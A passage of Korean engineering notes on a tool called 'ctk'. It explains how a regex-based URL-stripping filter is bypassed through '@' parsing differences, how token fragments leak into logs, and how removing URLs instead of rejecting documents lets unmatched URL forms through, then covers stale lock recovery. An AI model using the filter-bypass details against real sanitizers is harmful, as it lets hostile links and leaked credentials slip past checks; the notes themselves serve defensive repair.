> URL·길이를 재판정**하면 "제거가 다른 규칙을 무르게 할 수 없다"가 구조로 보장된다.

**② userinfo가 `@`를 한 번만 건너면 진짜 호스트가 남는다.** `https://user@pass@host/p`에서
정규식은 **첫** `@`에서 끊는데 WHATWG 파서는 **마지막** `@`를 구분자로 쓴다. 그래서
`removedHosts`에 호스트 대신 **userinfo 조각**이 실리고(`x-access-token@ghp_…@github.com`
형태는 git 클론 안내에서 흔하다 — **자격증명이 콘솔·요약으로 샌다**), 텍스트에는 진짜 호스트가
남은 채 검증을 통과한다. `removed=1`이 보고되므로 **"제거했다고 착각하는" 형태**다.
`[^\s/?#]*@`(탐욕적)로 고치면 마지막 `@`까지 먹는다.

**③ "형태별로 안 나빠졌다"가 문서 단위로는 거짓이다.** 못 잡는 URL 형태(프로토콜 상대 ·
비-http 스킴 · IDN)는 옛 패턴에서도 못 잡았지만, 거부하던 시절에는 **매칭되는 URL이 하나라도
있으면 문서 전체가 거부**돼 그런 형태를 함께 실은 문서도 부수적으로 격리됐다. 지금은 매칭되는
쪽만 지워지고 나머지를 실은 문서가 통과한다.

**규칙을 늘리기 전에 재라.** 이 코퍼스 실측: 프로토콜 상대 **0건** · `javascript:` **0건** ·
스킴 없는 호스트 **0건** · `data:` 1자산 5회(README의 `data:image/…`). 거부 규칙을 늘리면
정상 자산 1건이 막히고, 이 변경이 없앤 유료 무한 재시도 루프가 새 부류에서 재발한다.

**부수 관측**: 원문 선판정은 URL **안쪽**의 문자열도 규칙 매치로 센다(`https://x/sudo-guide`).
이 코퍼스에서는 해당 자산이 **0건**이라 오탐 비용이 없다. 늘어나면 "URL 스팬 안에 완전히
포함된 매치는 세지 않는다"로 좁힐 수 있다.

## 중단된 실행이 락을 남기고 빠져나갈 길이 없었다 (2026-08-24 실측 · 수정 완료)

`ctk gen` 배치가 중단되자(SIGKILL) 다음 실행이 `lock_contended`로 즉시 실패했다. 보유자 pid는
이미 죽어 있었는데도 3초 만에 막혔고, **복구 수단이 제품에 없었다** — `--help`에 락 관련 옵션이
없고 에러 메시지도 락 파일 경로만 알려줬다.

**원인 둘.**

1. `process.once("exit")` 안전망은 **신호로 죽을 때 실행되지 않는다.** 정상 종료만 덮는다.
2. 락 모듈 주석이 *"stale 락의 자동 강제 해제는 하지 않는다 — `ctk doctor`가 사용자 확인 하에
   제거한다는 규약은 **이후 단계의 몫**"*이라고 적고 그 복구 경로를 미뤘다. **그리고 만들어지지
   않았다.** 계획에만 있고 코드에 없는 탈출구는 없는 것과 같다.

**처방 — 증명할 수 있을 때만 회수한다.** 락 파일에 이미 `pid`와 `machine_id`가 있었다.
`machine_id`가 이 머신이고 그 pid가 살아 있지 않으면 보유자는 확실히 사라진 것이다.
판정 방향이 안전한 쪽으로 치우쳐 있다 — pid가 재사용되면 "살아 있다"로 읽혀 **회수하지 않고**
(fail-closed), 살아 있는 보유자가 죽은 것으로 보이는 경우는 없다. 머신이 다르면 그 pid는 이
머신에서 의미가 없으므로 판정하지 않고 `ctk doctor --unlock [--force]`로 보낸다.

**`process.kill(pid, 0)`의 세 결과를 구분해야 한다**(실측, macOS·uid 501):

| pid | 결과 | 해석 |
|---|---|---|
| 자기 자신 | 성공 | 살아 있음 |
| `1`(launchd, root 소유) | **throw EPERM** | **살아 있음** — 존재하는데 권한이 없다 |
| 999999999 | throw ESRCH | 죽음 |

**`ESRCH`만 죽음의 증거다.** `EPERM`을 죽음으로 읽으면 다른 사용자 소유 프로세스가 잡은 락을
회수해 두 실행이 동시에 카탈로그를 쓴다. 이 축은 파괴 실험으로 찾았다 — `code !== "ESRCH"`를
`false`로 바꿔도 표본에 EPERM 케이스가 없어 전부 통과했다. `pid 1`이 비-root에서 EPERM을 내므로
표본에 넣을 수 있다.
